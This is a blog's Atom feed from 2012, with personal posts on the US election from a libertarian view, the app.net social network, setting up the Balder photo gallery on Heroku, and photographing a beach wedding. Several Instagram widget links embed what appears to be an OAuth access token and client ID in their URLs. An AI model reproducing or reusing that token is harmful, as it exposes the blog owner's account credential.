<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[DV Digital]]></title>
  <link href="http://www.dan-vidal.com//atom.xml" rel="self"/>
  <link href="http://www.dan-vidal.com//"/>
  <updated>2012-11-07T02:50:19-05:00</updated>
  <id>http://www.dan-vidal.com//</id>
  <author>
    <name><![CDATA[Dan Vidal - Pod]]></name>
    <email><![CDATA[dan@dan-vidal.com]]></email>
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Your obligatory post-election post...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/11/07/your-obligatory-post-election-post-dot-dot-dot/"/>
    <updated>2012-11-07T01:41:00-05:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/11/07/your-obligatory-post-election-post-dot-dot-dot</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/IMG_6714.jpg" width="960" height="640" title="'The rest of the country'" ></p>

<p>As of right, President Barack Obama has secured his spot for a second term as President of these United States. To most observers, it wasn&#8217;t entirely unexpected, but his challenger, Mitt Romney, did put up a good fight, appealing to the &#8220;rest of America&#8221;, as it were, rather than focusing on the urban centers in the states with high electoral votes, as Obama did. In essence, it created the same split the US had four years ago. The map looks much the same, with the coasts being &#8220;blue&#8221; and the interior of the country being &#8220;red&#8221;&#8230;</p>

<!-- more -->


<p>In my travels I&#8217;ve visited each and every state in the Lower 48. At the base level, life will go on for each and every citizen of the US, much as it has had for them over the course of their lives. Whether there&#8217;s a Democrat or a Republican in the White House, their lives will go on. They will grow up, get jobs, maybe get married, maybe kick out a few kids, get old, and pass on, regardless of their location or political affiliation. Sure, economic conditions and the overall mood of the country do change (we are, as a lot, more miserable now than twenty years ago), but the overall lifestyle and conditions have remained pretty steady. Most of us have a roof over our heads and food on the table, which means we&#8217;re ahead of most of the world by a fair margin.</p>

<p>If we want to effect true change in our lives and political system, we can&#8217;t rely on just electing a different face of the same system every four years. Politicians may enter the world of politics with the best of ideals, but once in, they are either corrupted by power, or beaten down by the depth of the problems with our system, and they do the government equivalent of collecting a paycheck and just go through the motions.</p>

<p>To effect these changes, some have looked to the &#8220;third parties&#8221; in the US political system. Ranging from serious politicians such as ex-Republican governor of New Mexico <a href="http://garyjohnson2012.com/">Gary Johnson</a> of the <a href="http://lp.org/">Libertarian Party</a> to publicity hounds like Roseanne Barr, the world of third-party politics is a diverse and wild one. Unfortunately, as it stands, no one has yet to make a serious dent in the two-party system. Johnson may or may not have come close, but as of this writing, it&#8217;s hard to find out whether he crossed the &#8220;magic&#8221; threshold of getting 5 percent of the popular vote. This threshold, if crossed, would permit the Libertarian Party to qualify for matching campaign funds from the government in the next election cycle, a major bonus.</p>

<p>Now, I tend to focus on the Libertarians a lot, mainly because that is my registered party affiliation. It isn&#8217;t a big secret that I have a distaste for big central government. I see big central government much like I see a big corporation. The government (corporation) only holds itself up to it&#8217;s biggest shareholders (the corporations in this case!) and disregards the interests of the individual citizen. What the Libertarian platform seeks to accomplish is to scale back government to the bare minimums needed to maintain a cohesive nation, and decentralize a lot of functions that are currently central, allowing for a more responsive form of government. Note, for the record, Libertarians aren&#8217;t anarchists or corporatists. The philosophy at it&#8217;s root level actually allows for debate and discussion on the form of government itself, actually. Some who identify as Libertarians are borderline anarchists, sure, but most are just decent citizens looking to live their lives with a minimum of active government interference, but also expecting that the government should be there to discharge it&#8217;s prescribed duties, whatever those may be at a given moment.</p>

<p>For example, the Libertarian take on war is that it is generally a bad thing. A Libertarian government shouldn&#8217;t conduct offensive campaigns, only defensive. Thus, the government is responsible for the safety of it&#8217;s taxpayers from external threats. This also obviously extends to basic police functions as well. I&#8217;m actually of the same bent. If I&#8217;m paying taxes, even if they are minimal, I would want the body I&#8217;m paying taxes into, to be able to take care of me and keep me safe. Sure, I&#8217;m pro-Second Amendment. When seconds count, the cops are minutes away, after all, but if you step it up a level, a Walther PPS isn&#8217;t really going to matter much against a full-on army. I would expect a government to provide a small standing force to do that for me.</p>

<p>Much along the same lines, and where I kind of split with the general party line (again, the party generally welcomes dissent and debate), is that the government should provide a basic form of emergency health care, covered by taxes. With the abolition of many government agencies, basic healthcare could be provided, even at a lower tax rate. After all, if I&#8217;m healthy, I&#8217;m able to work and pay taxes into the system. If I&#8217;m sick or infirm, I&#8217;m not able to work.</p>

<p>Beyond making sure the citizens are safe and healthy, the government should be hands-off. However, under the current system, that just isn&#8217;t possible. There is an entire industry built around a two-party strong central government system. Lobbyists, contractors, bureaucrats, and so many others depend on this very system for their livelihood. The system in place isn&#8217;t interested in the welfare of it&#8217;s citizens, it is only interested in safeguarding it&#8217;s existence in perpetuity. Much like the fictional &#8220;Matrix&#8221;, some people are so plugged in and dependent, they&#8217;ll stop at nothing to ensure the survival of their system.</p>

<p>Thus, beyond the change in government, we need a sea change in society for true progress to be made. Less and less, we should look to big government to solve all our ills, or big business for that matter. People need to get off of their social media and reality show addictions and get involved in the political process, before their right to do so is gradually usurped. The right to keep and bear arms could be revoked tomorrow and only a few NRA lobbyists would raise a fuss, but if someone set off an EMP weapon in each Facebook data center, there would be a mass insurrection. Bread and circuses keep the masses in check. People bitch about their privacy rights all the time, but they&#8217;ll share every bowel movement on Facebook, like it matters. That&#8217;s a personal pet peeve of mine. Fact is, even if I like you, I don&#8217;t care. Spare me the mundane. Let me know when you do something interesting. Checking in at your cubicle is not interesting. Oops, nearly went off track there.</p>

<p>Also, we need to reawaken the spirit of &#8220;Do It Yourself&#8221; in this country. Now, I&#8217;m not suggesting we all become aircraft mechanics and architects and build our own personal planes and buildings, but at the same time, I&#8217;m shocked at the lack of general knowledge of the way things work in some of the people around me. Now, grant it, I&#8217;m certainly deficient in some of these areas (until recently, cars were a &#8216;stomp-on-gas-pedal-and-go-that-way&#8217; affair to me), but I&#8217;m actually amazed at the overall level of ignorance I encounter. I think a spirit of &#8220;DIY&#8221; would encourage more government participation by the citizens.</p>

<p>Now, this could be a double-edged sword. People may not always think about what is best for the community, but what is best for them. For example, outlawing abortion might suit the family down the street just fine, but might not ring true for the struggling single mom-to-be down the street. Where people definitely need to mind their own business is in matters of the body, so to speak. My body, my rules. As long as my mistakes only harm me, I should be allowed to make them without penalty or interference. Abortion, drug use, even assisted suicide, aka &#8220;death with dignity&#8221; should be decisions left to the individual, not others. At the end of the day, the Libertarian ideal is about individual freedom. Right now, there is a severe lack of it in this country. Sure, there&#8217;s a lot we can do, but at the same time, there is a lot we cannot do, that we should be able to do, especially when it comes to ourselves.</p>

<p>I didn&#8217;t mean for this to turn into a pro-Libertarian rant, OK, maybe I did, but nonetheless, the issues are still staring us in the face, even though our everyday life continues unabated, and even though at a basic level, for most of us, it isn&#8217;t that bad.</p>

<p>But, it could be better. My ideas and concepts could actually make accomplishing that quite easy. And, of course, if you just choose to kick back and figure out things as you go along, that&#8217;s alright too. It is your right as a human being to do the amount of work you think is necessary to be happy. For some this involves 16-hour days festering under fluorescent tubes. For others, this involves being outdoors and building things. For others, it kind of involves a lot of random things. It&#8217;s your life, neither the government, your friends, parents, families, talking heads on TV, self-help gurus, priests, rabbis, imams, or swamis need to be in the business of telling you how to live it.</p>

<p>Now, with the current federal election over, Obama has four more years to deliver on his promises. Being human, he won&#8217;t deliver on them all, but the American people just granted him an extension. While I hope he delivers on some, and misses the ball on others, I do know it&#8217;s up to us to keep an eye on him and the government as a whole, and gradually try to effect the sea change I spoke about earlier. Revolutions don&#8217;t happen overnight, even in this day and age. Patience is key.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[On Communities and Conduct...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/11/01/on-communities-and-conduct-dot-dot-dot/"/>
    <updated>2012-11-01T02:48:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/11/01/on-communities-and-conduct-dot-dot-dot</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/appnet.png" width="781" height="446" title="'alpha dot app dot net slash pod'" ></p>

<p>I&#8217;ve recently jumped onto a new social networking service called <a href="http://join.app.net/">app.net</a>. Founded by <a href="http://daltoncaldwell.com/">Dalton Caldwell</a>, app.net is, at a basic level, an ad-free version of Twitter. You basically pay $5 a month or $36 a year to join, and from there it&#8217;s pretty smooth sailing. Like any new service online, there&#8217;s a small fanatical userbase laying the groundwork for the new community, including the &#8220;tone&#8221;&#8230;</p>

<!-- more -->


<p>A few years ago, when <a href="http://www.technogeno.us/">Ryan</a> and I were kicking off <a href="http://talknightlife.com/">TNL</a>, one of the things we thought about was setting the standard for discourse in the community. The initial way we did this was via an invite system. We basically told people we knew and liked about the new site, gave them the gateway password, and told them to have at it while we built it. We invited people we knew were capable of intelligent discourse, as well as deliberately inviting a few &#8220;disruptive&#8221; elements, just to see if our little idea of the community setting the tone worked. For the most part, it did. Where our previous community frequently walked the line with porn, spam, and some pretty vicious personal battles, the TNL experiment proved to be mild in comparison. (Yes, mild&#8230;I wish we exported the blue site DB before we got shown the door, there were some real gems in there!) However, in general, it seemed to prove a point that an online community, especially a niche one, is capable of being largely self-regulating.</p>

<p>But, if a community grows to be amazingly large, can it self-police? It&#8217;s hard to say. Look at Facebook. Even if you have a limited friend list, you are still subject to the content they post, and they generally take influence from their friends, and so on. So, Facebook has devolved into a mindless mash of memes, chain letters, tabloid news, and general idiocy. However, objectively, sometimes general idiocy can be fun. I&#8217;ll gladly admit to laughing at the latest meme. I love &#8220;Me Gusta&#8221; ragefaces and the &#8220;Because &#8216;Fuck You&#8217;, That&#8217;s Why!&#8221; meme actually kind of sums up how I feel about most things I do. However, the general tone of Facebook is one of a shopping mall with disinterested mall cops who only do what they have to do, in order to keep their jobs. And the self-policing actions are generally arbitrary. People will laugh at a video of a guy getting hit by a train, but not if it originated from someone they have a problem with. Then it&#8217;s game on, they&#8217;re clicking &#8220;hide/report&#8221; for all it&#8217;s worth.</p>

<p>Twitter isn&#8217;t much better off. Due to it&#8217;s nature it is limited to short messages, but now that they have to make money, they are injecting ads into every available nook and cranny of the service. Which, since it&#8217;s a free service, they have every right to. It&#8217;s basically the mall, but you can only say things in short sentences. Very chaotic, and of course prone to brain-dropping syndrome.</p>

<p>Now, app.net is far smaller than both Facebook and Twitter. As of last count, they have less than 30,000 users. Which isn&#8217;t bad for a service that is not owned by a major corporation, and explicitly asks you to pay money for access, in exchange for providing a clean and friendly environment. It is the VIP lounge of the social networking scene. Well, back when VIP lounges actually were VIP anyhow.</p>

<p>The virtue of this small paywall is that it tends to keep the casual user out. When you have an open social network or community site, basically anyone with something to say can come by. Now, I&#8217;m all about giving people the freedom to express themselves, but on the internet, the price of that freedom is spam and a lower quality of conduct. On a free network, that is. Spammers aren&#8217;t going to pay to access a small community of individuals who have no interest in their products, and anyone with a &#8220;casual&#8221; opinion or an insult isn&#8217;t going to pay money just to rattle someone&#8217;s cage. With app.net, it has led to a general atmosphere of camaraderie and educated discourse. While the language itself is as &#8220;free&#8221; as any other site, it&#8217;s generally used in context, and not just for the sake of saying &#8220;fuck&#8221; every third word. And the feeling is generally virulent. The user feels he or she needs to be at the level of the community in order to engage them. I post on there a few times a day, and I&#8217;m usually pretty cautious about how I phrase myself. Now, one of the virtues of app.net is an open API. You pay a little extra for access, but it allows for a whole host of third-party applications and tie-ins. Today, I started using an <a href="http://ifttt.com/">IFTTT</a>recipe to link my Instagram feed to app.net. While something like this is encouraged as it makes app.net more appealing, I almost feel that I should maybe de-link it, since some of my Instagrams are a bit low-brow for the community.</p>

<p>However, it seems app.net, with it&#8217;s spirit of dissatisfaction against the status quo of monolithic and exploitative social networks like Facebook and Twitter, is proving on a larger scale, that the early adopters can and do set the tone and unwritten code of conduct for a web community and social network. It will be an interesting experiment to watch, especially if it catches fire in a major way. How will advertisers approach a community that has no love for their techniques, but still uses their products anyways? How will they advertise in a place with no advertising mechanism? Will app.net cancel the accounts of spammers? Those questions do remain. I can see &#8220;guerrilla marketers&#8221; and so-called &#8220;social media consultants&#8221; signing up at the least. Those types of people lose sleep over the fact that somewhere in the world, there&#8217;s a social media service they aren&#8217;t a part of. God forbid their already-rigged metrics slip half a percentage point. Wait till they find out there&#8217;s services in China with half-a-billion members who conduct their daily discourse entirely in Mandarin. They&#8217;ll be running down to the mall kiosks to buy Rosetta Stone - Mandarin Edition.</p>

<p>Thankfully app.net has a very prominent blocking feature.</p>

<p>The way I see it developing is much like TV networks such as HBO did. People specifically pay money to access HBO, not only for it&#8217;s quality unfiltered content, but because there are no obvious ads. I say &#8216;obvious&#8217; since I do consider the little half-hour bits about stuff on HBO produced by HBO to be a form of advertising designed to keep you subscribed. Which is fine. It is the service merely preserving itself. I guess the app.net staff does the same thing, since Dalton actively participates in the community and keeps people informed on &#8220;what&#8217;s next&#8230;&#8221;</p>

<p>Personally, I think it&#8217;s the future. I think social media is going to go more &#8220;boutique&#8221;, and less &#8220;mall&#8221;, and people will have to adjust their thinking accordingly. The open internet will and should always still be there, but more and more, I see paid-for and niche social and community sites becoming the norm as people tire of the constant bombardment of advertisers on the large free services like Facebook and Twitter.</p>

<p>They aren&#8217;t destined for failure either. I can actually see them adopting a two-tiered approach in the classic web fashion. Free access with ads, or pay a small monthly fee to remove them. They&#8217;ll take a page from the small innovators like app.net and call it their own. However, to truly compete, they need more effective filters. An ad-free experience means nothing if there&#8217;s still guerrilla marketers vying for your attention. &#8220;Hey Pod, haven&#8217;t seen you in awhile, how&#8217;s life? Oh really? Cool, well, ya know, I can get you 10,000 followers in a month if you act right now!&#8221;.</p>

<p>But that&#8217;s for another rant.</p>

<p>I think I&#8217;m going to go post some cat photos on Facebook and say the word &#8216;fuck&#8217; a few times in succession. Then off to app.net and make recommendations on camera equipment.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[The virtues of open-source...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/29/the-virtues-of-open-source-dot-dot-dot/"/>
    <updated>2012-10-29T13:12:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/29/the-virtues-of-open-source-dot-dot-dot</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/ruby.png" width="679" height="410" title="'Coding'" ></p>

<p>Sorry about the dearth of updates over the past few days. The wedding edit took some time, as well as real-life things having to happen as well. And then Halloween. The biggest, most interesting challenge, however, was the selection and deployment of a web application to display the edited photos from Tal and Erick&#8217;s wedding&#8230;</p>

<!-- more -->


<p>The edit itself went flawlessly. With my MacBook Air being a completely solid-state system, the actual rendering and editing took no time at all. Any time spent was purely on creative decisions. Protip - double-check that your sensor is clean. Cloudless blue skies make for wonderful wedding backdrops, but every little dust particle shows up. And the ultrasonic cleaner will not get them all. I spent a good amount of time spotting each photo. I usually check my sensor, but my MK II has the cleaning system, so I thought nothing of it. Wrong. Dust still adheres to the sensor surface.</p>

<p>I teased the bride and groom with little Instagram previews of my progress. It was a photo of a photo, but they got a kick out of it.</p>

<p><a href='http://www.dan-vidal.com//blog/2012/10/23//' data-instagram-url='http://instagr.am/p/RJTU0XAgCa/' class='instagram-image'><img src='http://distilleryimage2.s3.amazonaws.com/ba2799ba1d7311e2959322000a1e9e0c_7.jpg' alt='Your turn in the render render @simply_sarah7' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/normal'>Normal</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=25.835181305,-80.182557106'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=25.835181305,-80.182557106&markers=25.835181305,-80.182557106&zoom=14&size=612x200&sensor=false' alt='Talk Nightlife' /></a><br/>Taken at Talk Nightlife</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73&response_type=token&scope=likes+comments' id='308863042945417370_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p>Finally, I completed the edit, and then had to tackle the task of how best to display the photos.</p>

<p>Now, the obvious solution would have been to just use a canned solution like Flickr, or 500 px. While both services have their strong points, the fact that I don&#8217;t have direct control over my content did give me cause for concern. Plus, with my recent forays into the world of building web applications and coding, I wanted to roll my own solution as much as possible.</p>

<p>Initially, I wanted to present the site via Octopress. I have experience in Octopress now, because of this blog, and several photo display plugins have been written for the platform.</p>

<p>I had done some research, and found that the web app <a href="http://fancyapps.com/fancybox">Fancybox</a> integrated somewhat smoothly with Octopress. Also, a fellow Octopress user, <a href="http://tritarget.org/blog/2012/05/07/integrating-photos-into-octopress-using-fancybox-and-plugin/">Tritarget</a> had written a pretty good plugin which made the display of photos even easier, since it utilized simple Markdown tags, rather than coding raw HTML.</p>

<p>To make things easy, and not interfere with the operation of this blog, I chose to spin up another instance on my <a href="http://heroku.com/">Heroku</a> account. Heroku is the ideal choice for this and other projects of mine because I can spin up as many instances as I want, and only accrue charges for the total amount of resources (regardless of the number of apps) that I consume. After a little tweaking and adjustments, I got Fancybox and the plugin to play nice with Octopress.</p>

<p>Fancybox is probably the best-looking HTML-based photo display app out there. Slick transitions, a great UI, and easy implementation (mostly), make for a great quick-and-dirty display solution. However, the downside is, there is no practical way, that I found, to do a &#8220;gallery&#8221;. And a gallery was needed since my final edit came to 530 photos.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/preview_collage.jpg" width="960" height="960" title="'Previews'" ></p>

<p>And I certainly wasn&#8217;t going to manually input the Markdown tags for 530 photos. So, with that in mind, I decided to divest my thoughts of using Octopress. I set out to find a dedicated photo display solution. Some enterprising individuals had written plugins which can read Flickr sets, but I didn&#8217;t want to host on Flickr, for copyright and personal reasons. So, I googled around a bit and found several Rails-based photo gallery apps.</p>

<p>Now, some of you may ask, why wouldn&#8217;t I just use the Rails-based photo gallery app that I had already, i.e. <a href="http://seenightlife.com/">See Nightlife</a>?</p>

<p>Well, to be honest, See Nightlife is broken. I can upload and display, but all organizational tools are offline. It&#8217;s a &#8220;write once&#8221; solution as it stands. I can&#8217;t even delete photos. Also, Ryan and I simply haven&#8217;t had the time to fix it. Plus, the app it was based on, <a href="https://github.com/rapind/albumdy">Albumdy</a> is no longer being maintained.</p>

<p>As this was to display the wedding photos of two of my closest friends, something a little more reliable needed to be found. These are wedding photos, not a bunch of images of kids blindly worshipping some guy playing music off of his Mac.</p>

<p>So, with that in mind, I settled on a fairly popular Rails app called <a href="http://balderapp.com/">Balder.</a></p>

<p>Developed and maintained by Espen Antonsen out of Norway, Balder is a currently-maintained-and-produced Rails app for displaying photos in a collection/album format. And it fit my use case perfectly, as I wanted to host my photos on S3, and have the app live on Heroku. Heroku is more for running applications, and not storage. S3 is eminently more suited to storage, hence &#8220;Simple Storage Service&#8221; (S3). Espen himself uses this setup, and even provided a howto guide <a href="http://blog.inspired.no/rails-photo-gallery-balder-on-heroku-and-s3-726/">on his blog</a> on how to do it. In a nutshell, you provide Balder your S3 key, secret, and bucket name in a config file, commit to Heroku, and go from there. The one stumbling block I encountered is that the uploader itself tries to call an EXIF display module, which is dependent on a UNIX executable, which to my knowledge, cannot be installed on Heroku. So, even though the initial deployment was fast, the actual implementation wasn&#8217;t.</p>

<p>Now, where the virtues of open source kick in is that I had the code for Balder on my local machine. Through Heroku&#8217;s logging, I could see where the app was breaking uploads. I&#8217;m still a &#8216;babe in the woods&#8217; when it comes to coding, but I can read what the code is doing. I saw where it was getting hung up, but had no idea on how to fix it, or comment it out, since I specifically didn&#8217;t need EXIF data to be displayed. For those who may not be familiar, EXIF data is basically metadata contained in a JPEG file, which shows things like the camera type, exposure settings, and so on. You can see the EXIF data of a photo by doing the &#8220;File Info&#8221; function on your operating system of choice.</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/exif.png" width="964" height="541" title="'Coding'" ></p>

<p>So, via the <a href="https://github.com/espen/balder">issues tracker in the Github repository for Balder</a>, I submitted a request for support from the developer. Now, since the app is free, and Espen derives no income from it, he was under zero obligation to respond to me. Since it was the weekend, I didn&#8217;t expect much right away. But, by this morning, he had filed a response to my request:</p>

<blockquote><p>Try commenting out &#8220;before_create :exif_read&#8221; in the photo model. I will look into this later but currently too busy with other work.</p><footer><strong>Espen Antonsen</strong> <cite><a href='https://github.com/espen/balder/issues/36'>HTML5 Uploader Generates HTTP Error</a></cite></footer></blockquote>


<p>I appreciated his honesty, that&#8217;s for sure. Way more than I expected. Most free open-source projects are one-shot deals where the developer does the initial work, and then forgets about it. So, I was pleasantly surprised at a reply.</p>

<p>And fortunately, his solution worked. I commented out a call to the non-existent EXIF module, and successfully uploaded some photos as a test. After confidently seeing that they displayed and cycled according to my wishes, I then began to upload the wedding photos in earnest. Balder has an excellent organizational structure. I can create a collection, let&#8217;s call it &#8220;Wedding&#8221;, and then albums for each portion of the event. Very slick. Five stars. And wonderful support from someone whom isn&#8217;t even obligated to do so.</p>

<p>Now, if this was a closed-source solution or a problem with a hosted service like Flickr, I would have had no way of figuring out what was wrong. I would have had to email their support, wait, and hope they could get to the issue in time. With open-source, I can peek under the hood, make some educated assessments as to what the issue is, and attempt a fix on my own. Or at the least, get concrete info that the developer understands so he or she can make a more effective fix. Plus, I got to learn a little more about just what makes a Rails-based web app tick.</p>

<p>Right now, the app is deployed to Heroku, and running smoothly. I plan on using Balder in general, from here on out and whenever possible for my hosting needs. Open source for the win, as they say.</p>

<ul>
<li>Sidebar: I&#8217;d love to show you guys the results of the wedding, but since it was a personal affair, I would rather receive clearance before I share the results with the public. Thanks for understanding, all.</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[A classic sunset...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/23/a-classic-sunset-dot-dot-dot/"/>
    <updated>2012-10-23T00:39:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/23/a-classic-sunset-dot-dot-dot</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/t-2535.jpg" width="960" height="640" title="'Perty'" ></p>

<p>You definitely can&#8217;t argue with the sunsets on the Outer Banks of North Carolina.</p>

<!-- more -->


<p>Sure, sunset photos are contrived and &#8220;have been done&#8221;, but sometimes, regardless of your skill level, every photographer needs to shoot a few &#8220;typical&#8221; images. If anything, for those of us who take ourselves too seriously, you can justify it as a &#8220;test&#8221; or &#8220;calibration&#8221; or &#8220;comparison&#8221;.</p>

<p>Besides, it&#8217;s rather nice-looking.</p>

<p>I think in terms of &#8220;a place to go to do nothing&#8221;, Emerald Isle has Key West beat. There is absolutely nothing going on but the weather. No clubs, no bars, just some pretty pricey real estate and people just kicking back. You have to bring your own fun, essentially. Which was kind of nice.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Shooting weddings...]]></title>
    <link href="http://www.dan-vidal.com//blog/2012/10/22/shooting-weddings-dot-dot-dot/"/>
    <updated>2012-10-22T01:23:00-04:00</updated>
    <id>http://www.dan-vidal.com//blog/2012/10/22/shooting-weddings-dot-dot-dot</id>
    <content type="html"><![CDATA[<p><img class="center" src="https://s3.amazonaws.com/dvblog/talerick_preview.jpg" width="960" height="610" title="'FU-T'" ></p>

<p>A huge congratulations to my friends and neighbors Talmage and Erick on their wedding this past weekend. We all went up to Emerald Isle, NC for the ceremony. It was pretty spectacular.</p>

<p>I don&#8217;t explicitly advertise myself as a wedding photographer. While I know it can be lucrative, I&#8217;ve also heard a lot of horror stories from other shooters about the stress involved, and not just from bridezillas either&#8230;</p>

<p>But I don&#8217;t turn down weddings that come my way&#8230;</p>

<!-- more -->


<p>Typically, a wedding will come my way about once a year. It&#8217;s always through a friend or acquaintance. And, for the most part, they know how I shoot when they hire me. They know that I&#8217;m definitely not a wedding photography specialist.</p>

<p>The wedding I shot this past weekend with Tal and Erick was a great example. I&#8217;ve known Tal since about 2004 through the club scene and her being a poster on TNL, and Erick for a little bit longer than that. They both knew my specialties in terms of photography. But, they also wanted a distinct look and feel for their photos, and also the obvious of preferring to hire a friend rather than someone they didn&#8217;t know.</p>

<p>For me, it was an opportunity to change things up a bit in terms of my photo work, and an excuse to rent some quality equipment and maybe try some new concepts.</p>

<p><a href='http://www.dan-vidal.com//blog/2012/10/19//' data-instagram-url='http://instagr.am/p/Q_FrW8ggJe/' class='instagram-image'><img src='http://distilleryimage6.s3.amazonaws.com/d13ac15c1a5511e29c6822000a1f9688_7.jpg' alt='Tele for @talmagelisabeth wedding.' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/normal'>Normal</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=34.682976,-76.912536'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=34.682976,-76.912536&markers=34.682976,-76.912536&zoom=14&size=612x200&sensor=false' alt='Best House At The Biotch' /></a><br/>Taken at Best House At The Biotch</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73&response_type=token&scope=likes+comments' id='305988269492011614_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p>My loadout for the wedding started as a grandiose idea in my head. Since my &#8220;gift&#8221; to them was essentially my work (only thing I asked for was transport and lodging), I wanted to make it shine. However, since I&#8217;m a one-man show here, eventually less was more. My final kit was:</p>

<ul>
<li>5D MK II - primary body</li>
<li>50D - backup body</li>
<li>580 EX Speedlite</li>
<li>580 EX II Speedlite from <a href="http://lensrentals.com/">Lens Rentals</a>.</li>
<li>16-35mm 2.8 L zoom lens</li>
<li>50mm 1.2 L prime lens</li>
<li>70-200 2.8 II L zoom lens</li>
<li>2 Fong Lightspheres from <a href="http://lensrentals.com/">Lens Rentals</a></li>
<li>ST-E2 Speedlite transmitter</li>
<li>2 32 GB CF cards</li>
<li>Joby Gorillapod</li>
<li>The Podbook Air</li>
<li>A GoPro Hero 2 from <a href="http://weekendweapons.com/">Travis</a>.</li>
</ul>


<p>And even then this was heavy. That&#8217;s a lot of glass and accessories to haul with you.</p>

<p>I was there primarily in a still-photography capacity, however, I did want to shoot some video too. A mutual friend, Pat Theodore, was on video duty with his Nikons, but I offered to throw in whatever I got with the GoPro and my MK II into the mix.</p>

<p>Thankfully, the one variable that I could not control cooperated. The weather was amazing.</p>

<p><a href='http://www.dan-vidal.com//blog/2012/10/19//' data-instagram-url='http://instagr.am/p/Q-v-TfggF9/' class='instagram-image'><img src='http://distilleryimage1.s3.amazonaws.com/52bcbd681a3b11e282a722000a1c8689_7.jpg' alt='Perty.' height='612' width='612' /></a><br/>Filtered with <a href='http://www.dan-vidal.com//blog/categories/normal'>Normal</a> through <a href='http://www.dan-vidal.com//blog/categories/instagram'>Instagram</a></p>


<!--more-->


<p><a href='http://maps.google.com?q=34.680565526,-76.923046936'><img border='0' src='http://maps.googleapis.com/maps/api/staticmap?center=34.680565526,-76.923046936&markers=34.680565526,-76.923046936&zoom=14&size=612x200&sensor=false' alt='On The Beach Drinking Beers' /></a><br/>Taken at On The Beach Drinking Beers</p>


<p class='instagram-comment-holder'><a href='https://instagram.com/oauth/authorize/?client_id=082223ce4af44db2a4b0440fd98957c9&redirect_uri=http://www.dan-vidal.com/#access_token=31120127.082223c.33c03a5584f54c3494027e191a8d7b73&response_type=token&scope=likes+comments' id='305892814431060349_31120127' class='instagram-comment-link'>Sign in with Instagram to view Likes and Comments</a></p>


<p>The Emerald Isle weather gods were definitely with us that day. And the wedding was planned to be right around sunset.</p>

<p>The true challenge of the wedding really wasn&#8217;t on a technical level for me. I was shooting at golden hour, on the beach, with people I know and get along famously with. The real challenge was on an organizational level. As I was the only still shooter for the wedding, I had my hands full, even with a small party (around 30 people), such as this one. I can see now why full-time wedding shooters, always have a second person with them. I got the photos I wanted, and then some, but it was definitely a few minutes of sheer intensity as I scrambled around to get the images. The biggest savior was definitely the 70-200. From a practical standpoint, the lens enabled me to get &#8220;the&#8221; key images of the actual vows portion of the ceremony, without being on top of the bride and groom. I also utilized one of the 580s I had with me as a remote light. I used the Gorillapod to strap it to the &#8220;altar&#8221; framework and put it on a secondary channel which I clicked over to as I needed it. I ended up not really using it, but it was nice to have on hand. And I had the GoPro running as a continuous record of the ceremony. I wonder how that came out&#8230;</p>

<p><img class="center" src="https://s3.amazonaws.com/dvblog/tal-3107.jpg" width="960" height="640" title="'In close but not'" ></p>

<p>And, one can definitely not argue with the virtue of having someone trained in makeup on hand. One of Tal&#8217;s friends, Kristin, along with Michelle T, handled that duty. Sure, brides have to look their best, but us behind the lens appreciate it too. A well-done makeup job saves us enormous amounts of time later. Tal has a natural glow to her anyways, but the makeup job will be saving me hours of time in post production this coming week.</p>

<p>Now, where the ceremony was mainly, from a technical perspective, about the 70-200, the candids at the reception back at the beach house were all about going wide, and using my 50 1.2 L. While not a nightclub setting, the lighting was darker and variable, and I wanted to get some &#8220;candids&#8221; like they expected out of me. And the 50 came through, especially later, when someone (not gonna say who!) decided to set off some heavy-duty fireworks in celebration of the happy couple.</p>

<p>That being said, it was definitely a great departure from my norm in terms of shooting. I probably bought a little more equipment than I really needed to for this specific ceremony, but, it is best to be overprepared than under. And, a wedding is one situation where you definitely need to make the client aware of whether you are there for stills, or video. I grabbed some video as time permitted, but I didn&#8217;t make it a priority. I had the GoPro with me mainly as an experiment, and anything out of the MK II was when the moment became rather static.</p>

